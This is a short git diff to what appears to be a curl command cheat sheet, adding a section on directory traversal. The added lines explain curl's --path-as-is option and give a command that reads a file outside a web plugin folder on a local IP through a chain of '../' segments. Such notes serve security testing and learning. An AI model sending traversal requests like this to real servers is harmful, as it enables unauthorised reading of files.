@@ -55,6 +55,11 @@ curl -XDELETE $ip/uploads/hello.txt
 
 # Send an HTTP/3 request:
 curl --http3 -v https://examplecom/users/login.html
+
+# For Directory traversal attacks:
+# `--path-as-is` is a **curl option** that tells curl: Do NOT normalize, clean, or canonicalize the URL path.  Send it to the server exactly as written. Example:
+curl --path-as-is "http://192.168.188.16:3000/public/plugins/alertlist/../../../../../../../../../../../Users/install.txt"
+
 ```
 
 Some flags:
